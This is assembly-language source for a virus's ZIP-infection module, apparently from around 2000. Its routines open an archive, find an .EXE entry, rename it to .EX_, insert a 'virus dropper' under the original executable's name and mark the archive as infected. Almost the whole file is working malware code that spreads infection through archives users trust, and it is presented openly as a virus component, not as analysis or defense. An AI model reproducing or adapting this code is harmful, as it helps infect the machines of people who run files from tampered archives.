   ; ---------------------------------------------------------------------------
   ; ZIP archives management     1.00     (x) 2000
   ; ---------------------------------------------------------------------------

   ; process_zip(EDX=filename,            -- find .EXE file, rename it to .EX_,
   ;             ESI=dropper code,           and add virus dropper with name of
   ;             ECX=dropper size) : CF      the first file

   ; zip_open(EDX=filename) : CF          -- open archive
   ; zip_findnext() : CF, CF=1--eof       -- read next file header (into zip_fh)
   ; zip_update()                         -- write back current file data
   ; zip_add(EDX=file_code,               -- add new file to archive
   ;         ECX=file_size,
   ;         ESI=file_name / 0--default,
   ;         EBX=file_time / 0--default)
   ; zip_close()                          -- close archive

   ; ---------------------------------------------------------------------------

   ; ZIP management library: uninitialized data

   zip_data                struc

   zip_saveebp             dd      ?

   zip_handle              dd      ?       ; opened file(zip archive) handle
   zip_thispos             dd      ?       ; offset of current zip_cd
   zip_nextpos             dd      ?       ; offset of next zip_cd offset
   zip_ecdoffs             dd      ?       ; ecd offset / @zip_cd[last+1]

   zip_ecd_size            equ     22
   zip_ecd                 label   byte
   zip_ecd_id              dd      ? ; end of central dir signature
   zip_ecd_thisdiskn       dw      ? ; number of this disk
   zip_ecd_ecdstartdiskn   dw      ? ; number of the disk with the start of the central directory
   zip_ecd_thisdiskecdn    dw      ? ; total number of entries in the central dir on this disk
   zip_ecd_totalecdn       dw      ? ; total number of entries in the central dir
   zip_ecd_cdsize          dd      ? ; size of the central directory
   zip_ecd_cdoffs          dd      ? ; offset of start of central directory with respect to the starting disk number
   zip_ecd_commentsize     dw      ? ; zipfile comment length
   zip_ecd_comment         label   byte  ; zipfile comment (variable size)

   zip_cd_size             equ     46
   zip_cd                  label   byte
   zip_cd_id               dd      ?     ;central file header signature   4 bytes  (0x02014b50)
   zip_cd_ver_madeby       dw      ?     ;version made by                 2 bytes
   zip_cd_ver_toextract    dw      ?     ;version needed to extract       2 bytes
   zip_cd_flags            dw      ?     ;general purpose bit flag        2 bytes
   zip_cd_compmethod       dw      ?     ;compression method              2 bytes
   zip_cd_datetime         dd      ?     ;last mod file time/date         4 bytes
   zip_cd_crc32            dd      ?     ;crc-32                          4 bytes
   zip_cd_compsize         dd      ?     ;compressed size                 4 bytes
   zip_cd_uncompsize       dd      ?     ;uncompressed size               4 bytes
   zip_cd_namesize         dw      ?     ;filename length                 2 bytes
   zip_cd_extrasize        dw      ?     ;extra field length              2 bytes
   zip_cd_commentsize      dw      ?     ;file comment length             2 bytes
   zip_cd_startdiskn       dw      ?     ;disk number start               2 bytes
   zip_cd_int_fileattr     dw      ?     ;internal file attributes        2 bytes
   zip_cd_fileattr         dd      ?     ;external file attributes        4 bytes
   zip_cd_fh_offs          dd      ?     ;relative offset of local header 4 bytes
   ; filename (variable size)
   ; extra field (variable size)
   ; file comment (variable size)

   zip_fh_size             equ     30
   zip_fh                  label   byte
   zip_fh_id               dd      ?     ;local file header signature     4 bytes  (0x04034b50)
   zip_fh_ver_toextract    dw      ?     ;version needed to extract       2 bytes
   zip_fh_flags            dw      ?     ;general purpose bit flag        2 bytes
   zip_fh_compmethod       dw      ?     ;compression method              2 bytes
   zip_fh_datetime         dd      ?     ;last mod file time/date         4 bytes
   zip_fh_crc32            dd      ?     ;crc-32                          4 bytes
   zip_fh_compsize         dd      ?     ;compressed size                 4 bytes
   zip_fh_uncompsize       dd      ?     ;uncompressed size               4 bytes
   zip_fh_namesize         dw      ?     ;filename length                 2 bytes
   zip_fh_extrasize        dw      ?     ;extra field length              2 bytes
   ; filename (variable size)
   ; extra field (variable size)

   zip_fname_size          equ     512
   zip_fname               db      zip_fname_size dup (?)

   zip_buf_size            equ     4096
   zip_buf                 db      zip_buf_size dup (?)

   zip_data                ends

   ; ---------------------------------------------------------------------------

   ; subroutine:   process_zip
   ; input:        EDX=filename (.zip/.exe(sfx))
   ; output:       CF=0 -- file has been infected

   process_zip:            pusha
                           sub     esp, size zip_data   ; all vars on the stack
                           mov     eax, ebp
                           mov     ebp, esp             ; ebp points to zip_data
                           cld

                           mov     zip_saveebp[ebp], eax

                           call    zip_open                  ; open archive
                           jc      __exit

                           mov     esi, ARC_MAXFILETOSCAN

   __cycle:                dec     esi
                           jz      __exitcycle

                           call    zip_findnext              ; get file header
                           jc      __exitcycle

                           movzx   eax, zip_fh_namesize[ebp]
                           lea     edx, zip_fname[ebp]
                           lea     edi, [edx+eax-4]

                           mov     eax, [edi]
                           or      eax, 20202000h
                           neg     eax

                           cmp     eax, -EXT_NEW   ; alredy infected?
                           stc
                           je      __exitcycle

                           cmp     zip_fh_uncompsize[ebp], MINDROPSIZE
                           jb      __cycle

                           mov     eax, [edi]
                           or      eax, 20202000h
                           neg     eax

                           cmp     eax, -EXT_EXE
                           jne     __cycle

                           mov     ebx, EV_DROPPER_START_ARC
                           eventX  EV_DROPPER_INIT  ; out: ESI,ECX
                           mov     edx, esi ; EDX=code, ECX=size

                           xor     esi, esi ; file_name: 0=default
                           xor     ebx, ebx ; file_time: 0=default
                           call    zip_add  ; add new file (our body) to archive

                           eventX  EV_DROPPER_DONE

                           push    zip_thispos[ebp]    ; reread current zip_fh
                           pop     zip_nextpos[ebp]
                           call    zip_findnext

                           mov     eax, not EXT_NEW
                           not     eax
                           stosd

                           call    zip_update  ; rename current file in archive

                           clc

   __exitcycle:            pushf
                           call    zip_close
                           popf

   __exit:                 lea     esp, [esp + size zip_data]
                           popa
                           ret

   ; ---------------------------------------------------------------------------

   ; subroutine:   zip_open
   ; input:        EDX=filename
   ; output:       CF=0 -- file has been opened (use zip_close to close file)
   ;               CF=1 -- an error occured

   zip_open:               pusha

                           callZ   fopen_rw                ; open archive
                           jc      __error
                           xchg    ebx, eax

                           callZ   fgetsize                ; get initial offs
                           xchg    esi, eax

   __cycle1:               sub     esi, zip_buf_size - zip_ecd_size + 1
                           sbb     eax, eax
                           not     eax
                           and     esi, eax

                           mov     edx, esi
                           callZ   fseek

                           lea     edx, zip_buf[ebp]       ; read zip_ecd
                           mov     ecx, zip_buf_size
                           callZ   fread
                           or      eax, eax
                           jz      __close

                           sub     eax, zip_ecd_size - 1
                           add     esi, eax
                           add     edx, eax

   __cycle2:               dec     eax
                           jl      __exitcycle2
                           dec     esi
                           dec     edx

                           mov     edi, [edx]
                           neg     edi
                           cmp     edi, -06054B50h     ; end-of-central-dir-id
                           jne     __cycle2

                           mov     zip_ecdoffs[ebp], esi

                           mov     edx, esi
                           callZ   fseek

                           lea     edx, zip_ecd[ebp]
                           push    zip_ecd_size
                           pop     ecx
                           callZ   fread

                           mov     ax, zip_ecd_thisdiskecdn[ebp] ; multi vol.?
                           cmp     ax, zip_ecd_totalecdn[ebp]
                           jne     __close

                           mov     eax, zip_ecd_cdoffs[ebp]  ; nextpos
                           mov     zip_nextpos[ebp], eax

                           mov     zip_handle[ebp], ebx         ; store handle

                           clc

                           popa
                           ret

   __exitcycle2:           or      esi, esi
                           jnz     __cycle1

   __close:                callZ   fclose

   __error:                stc

                           popa
                           ret

   ; ---------------------------------------------------------------------------

   ; subroutine:   zip_findnext
   ; output:       CF=0 -- success
   ;               CF=1 -- eof or error

   zip_findnext:           pusha

   __cycle1:               mov     edx, zip_nextpos[ebp]
                           cmp     edx, zip_ecdoffs[ebp]       ; eof?
                           je      __error
                           mov     zip_thispos[ebp], edx

                           mov     ebx, zip_handle[ebp]
                           callZ   fseek

                           lea     edx, zip_cd[ebp]
                           push    zip_cd_size
                           pop     ecx
                           callZ   fread
                           cmp     eax, ecx
                           jne     __error

                           mov     eax, zip_cd_id[ebp]       ; check entry id
                           neg     eax
                           cmp     eax, -02014b50h
                           jne     __error

                           movzx   ecx, zip_cd_namesize[ebp]
                           cmp     ecx, zip_fname_size       ; too big name?
                           jae     __cycle1
                           movzx   eax, zip_cd_extrasize[ebp]
                           movzx   edx, zip_cd_commentsize[ebp]
                           add     eax, edx
                           lea     eax, [eax+ecx+zip_cd_size]
                           add     zip_nextpos[ebp], eax     ; update nextpos

                           lea     edx, zip_fname[ebp]  ; read filename
                           callZ   fread

                           mov     byte ptr [edx+eax], 0 ; make asciiz

                           mov     edx, zip_cd_fh_offs[ebp]
                           callZ   fseek

                           lea     edx, zip_fh[ebp]
                           push    zip_fh_size
                           pop     ecx
                           callZ   fread

                           clc

                           popa
                           ret

   __error:                stc

                           popa
                           ret

   ; ---------------------------------------------------------------------------

   ; subroutine:   zip_update

   zip_update:             pusha

                           mov     edx, zip_thispos[ebp]
                           mov     ebx, zip_handle[ebp]
                           callZ   fseek

                           call    zip_write_cd_name

                           mov     edx, zip_cd_fh_offs[ebp]
                           callZ   fseek

                           call    zip_write_fh_name

                           popa
                           ret

   ; ---------------------------------------------------------------------------

   zip_write_cd_name:      lea     edx, zip_cd[ebp]
                           push    zip_cd_size
                           pop     ecx
                           callZ   fwrite

                           lea     edx, zip_fname[ebp]
                           movzx   ecx, zip_cd_namesize[ebp]
                           callZ   fwrite

                           ret

   zip_write_fh_name:      lea     edx, zip_fh[ebp]
                           movzx   ecx, zip_fh_namesize[ebp]
                           add     ecx, zip_fh_size
                           callZ   fwrite

                           ret

   ; ---------------------------------------------------------------------------

   ; subroutine:   zip_add
   ; input:        EDX=file code
   ;               ECX=file size
   ;               ESI=file name (0=default--zip_fname)
   ;               EBX=file time (0=default--zip_fh_datetime)

   zip_add:                pusha
                           cld

   ; calc data checksum
                           pusha
                           xor     eax, eax
                           call    xcrc32
                           mov     [esp+5*4], eax
                           popa                    ; edx = crc

   ; prepare headers
                           lea     edi, zip_fh_ver_toextract[ebp]
                           call    zip_add_fillentryz

                           lea     edi, zip_cd_ver_toextract[ebp]
                           call    zip_add_fillentryz

                           xor     eax, eax
                           stosd                   ; commentsize=0, startdiskn=0
                           stosw                   ; int_fileattr
                           push    20h
                           pop     eax
                           stosd                   ; fileattr

                           or      esi, esi        ; filename: 0=default
                           jz      __2

                           lea     edi, zip_fname[ebp] ; copy fname, calc length
                           xor     ebx, ebx
   __1:                    inc     ebx
                           lodsb
                           stosb
                           or      al, al
                           jnz     __1
                           dec     ebx

                           mov     zip_fh_namesize[ebp], bx
                           mov     zip_cd_namesize[ebp], bx
   __2:

   ; insert some shit into file

                           mov     ebx, zip_handle[ebp]
   ;;
                           mov     esi, zip_ecd_cdoffs[ebp]

                           mov     zip_cd_fh_offs[ebp], esi

                           movzx   edi, zip_fh_namesize[ebp]
                           add     edi, zip_fh_size
                           add     edi, [esp].pusha_ecx

                           call    zip_add_insert
   ;;
                           call    zip_write_fh_name

                           mov     edx, [esp].pusha_edx
                           mov     ecx, [esp].pusha_ecx
                           callZ   fwrite

                           add     zip_ecdoffs[ebp], edi
                           add     zip_ecd_cdoffs[ebp], edi

                           add     zip_thispos[ebp], edi
                           add     zip_nextpos[ebp], edi

   ;;

                           mov     esi, zip_ecdoffs[ebp]

                           movzx   edi, zip_cd_namesize[ebp]
                           add     edi, zip_cd_size

                           call    zip_add_insert
   ;;

                           add     zip_ecd_cdsize[ebp], edi
                           add     zip_ecdoffs[ebp], edi
                           inc     zip_ecd_thisdiskecdn[ebp]
                           inc     zip_ecd_totalecdn[ebp]

                           call    zip_write_cd_name

                           lea     edx, zip_ecd[ebp]
                           push    zip_ecd_size
                           pop     ecx
                           callZ   fwrite

                           popa
                           ret

   ; ---------------------------------------------------------------------------

   zip_add_fillentryz:     scasw                   ; vertoextract

                           xor     eax, eax
                           stosd                   ; flags=0  compmethod=0

                           or      ebx, ebx        ; datetime: 0=default
                           jnz     __1
                           mov     ebx, [edi]
   __1:
                           mov     eax, ebx
                           stosd                   ; datetime

                           mov     eax, edx
                           stosd                   ; crc32

                           mov     eax, ecx
                           stosd                   ; compsize
                           stosd                   ; uncompsize

                           scasw                   ; namesize

                           xor     eax, eax
                           stosw                   ; extrasize

                           ret

   ; ---------------------------------------------------------------------------

   ; input: EBX=file handle
   ;        ESI=file offset
   ;        EDI=size of block
   ; output:file pos = ESI

   ; file map: <--->ESI
   ; before:   abcdefghijklm
   ; after:    abcde<--EDI-->fghijklm

   zip_add_insert:         pusha

                           callZ   fgetsize
                           xchg    edx, eax

   __cycle:                mov     ecx, edx
                           sub     ecx, esi
                           jz      __exitcycle
                           cmp     ecx, zip_buf_size
                           jbe     __1
                           mov     ecx, zip_buf_size
   __1:
                           sub     edx, ecx
                           call    zip_add_moveblock

                           jmp     __cycle

   __exitcycle:
                           mov     edx, esi
                           callZ   fseek

                           popa
                           ret

   ; ---------------------------------------------------------------------------

   ; input: EBX=file handle
   ;        EDX=offset of the block
   ;        ECX=block size (not more than zip_buf_size)
   ;        EDI=displacement

   zip_add_moveblock:      pusha

                           push    edx
                           callZ   fseek

                           lea     edx, zip_buf[ebp]
                           callZ   fread

                           xchg    edx, [esp]
                           add     edx, edi
                           callZ   fseek

                           pop     edx
                           callZ   fwrite

                           popa
                           ret

   ; ---------------------------------------------------------------------------

   ; subroutine:   zip_close

   zip_close:              pusha

                           mov     ebx, zip_handle[ebp]
                           callZ   fclose

                           popa
                           ret

   ; ---------------------------------------------------------------------------
